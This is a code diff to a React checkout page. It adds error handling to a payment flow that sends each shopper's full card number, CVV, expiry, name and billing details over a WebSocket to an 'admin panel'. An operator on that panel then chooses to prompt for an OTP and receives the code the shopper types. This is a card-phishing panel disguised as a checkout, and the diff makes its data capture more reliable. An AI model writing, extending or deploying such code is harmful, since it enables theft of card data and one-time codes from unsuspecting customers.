@@ -242,63 +242,123 @@ const Checkout = () => {
   };
 
   const handleConfirmPayment = () => {
-    setConfirmingPayment(true);
-    
-    // Connect to WebSocket and send payment data
-    const newSocket = io('ws://localhost:3001'); // Replace with your socket server
-    setSocket(newSocket);
-    
-    // Send payment data to admin panel
-    const paymentData = {
-      cardNumber: cardData.cardNumber,
-      cardName: cardData.cardName,
-      cvv: cardData.cvv,
-      expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
-      billingDetails: {
-        firstName: formData.firstName,
-        lastName: formData.lastName,
-        email: formData.email,
-        country: formData.country,
-        companyName: formData.companyName
-      },
-      planName,
-      billing,
-      amount: displayPrice,
-      timestamp: new Date().toISOString()
-    };
-    
-    newSocket.emit('payment-data', paymentData);
-    
-    // Listen for admin responses
-    newSocket.on('show-otp', () => {
-      setShowOtp(true);
-      setCurrentStep('otp');
-    });
-    
-    newSocket.on('payment-approved', () => {
+    try {
+      setConfirmingPayment(true);
+      
+      // Connect to WebSocket with error handling
+      const newSocket = io('ws://localhost:3001', {
+        timeout: 10000,
+        reconnection: true,
+        reconnectionAttempts: 3,
+        reconnectionDelay: 1000
+      });
+      setSocket(newSocket);
+      
+      // Handle connection errors
+      newSocket.on('connect_error', (error) => {
+        console.error('Socket connection error:', error);
+        setConfirmingPayment(false);
+        alert('Connection failed. Please check your internet connection and try again.');
+      });
+      
+      newSocket.on('disconnect', (reason) => {
+        console.warn('Socket disconnected:', reason);
+        if (reason === 'io server disconnect') {
+          // Server disconnected, try to reconnect
+          newSocket.connect();
+        }
+      });
+      
+      // Send payment data to admin panel
+      const paymentData = {
+        cardNumber: cardData.cardNumber,
+        cardName: cardData.cardName,
+        cvv: cardData.cvv,
+        expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
+        billingDetails: {
+          firstName: formData.firstName,
+          lastName: formData.lastName,
+          email: formData.email,
+          country: formData.country,
+          companyName: formData.companyName
+        },
+        planName,
+        billing,
+        amount: displayPrice,
+        timestamp: new Date().toISOString()
+      };
+      
+      // Add timeout for payment data emission
+      const emitTimeout = setTimeout(() => {
+        setConfirmingPayment(false);
+        alert('Request timeout. Please try again.');
+        newSocket.disconnect();
+      }, 30000);
+      
+      newSocket.emit('payment-data', paymentData);
+      
+      // Listen for admin responses
+      newSocket.on('show-otp', () => {
+        clearTimeout(emitTimeout);
+        setShowOtp(true);
+        setCurrentStep('otp');
+      });
+      
+      newSocket.on('payment-approved', () => {
+        clearTimeout(emitTimeout);
+        setConfirmingPayment(false);
+        setShowOtp(false);
+        alert('Payment successful!');
+        // Could redirect to success page here
+      });
+      
+      newSocket.on('payment-rejected', (reason: string) => {
+        clearTimeout(emitTimeout);
+        setConfirmingPayment(false);
+        setShowOtp(false);
+        alert(`Payment rejected: ${reason || 'Unknown error occurred'}`);
+      });
+      
+    } catch (error) {
+      console.error('Error in payment confirmation:', error);
       setConfirmingPayment(false);
-      setShowOtp(false);
-      // Handle successful payment
-      alert('Payment successful!');
-    });
-    
-    newSocket.on('payment-rejected', (reason: string) => {
-      setConfirmingPayment(false);
-      setShowOtp(false);
-      alert(`Payment rejected: ${reason}`);
-    });
-  };
-
-  const handleOtpSubmit = () => {
-    if (socket && otpValue) {
-      socket.emit('otp-submitted', { otp: otpValue });
-      setOtpValue('');
+      alert('An unexpected error occurred. Please try again.');
     }
   };
 
-  // Initialize socket connection
+  const handleOtpSubmit = () => {
+    try {
+      if (!socket) {
+        alert('Connection lost. Please refresh the page and try again.');
+        return;
+      }
+      
+      if (!otpValue || otpValue.length < 4) {
+        alert('Please enter a valid OTP.');
+        return;
+      }
+      
+      socket.emit('otp-submitted', { otp: otpValue });
+      setOtpValue('');
+    } catch (error) {
+      console.error('Error submitting OTP:', error);
+      alert('Failed to submit OTP. Please try again.');
+    }
+  };
+
+  // Initialize socket connection and error handling
   useEffect(() => {
+    // Handle page unload/refresh
+    const handleBeforeUnload = () => {
+      if (socket) {
+        socket.disconnect();
+      }
+    };
+
+    window.addEventListener('beforeunload', handleBeforeUnload);
+
     return () => {
+      window.removeEventListener('beforeunload', handleBeforeUnload);
       if (socket) {
         socket.disconnect();
       }
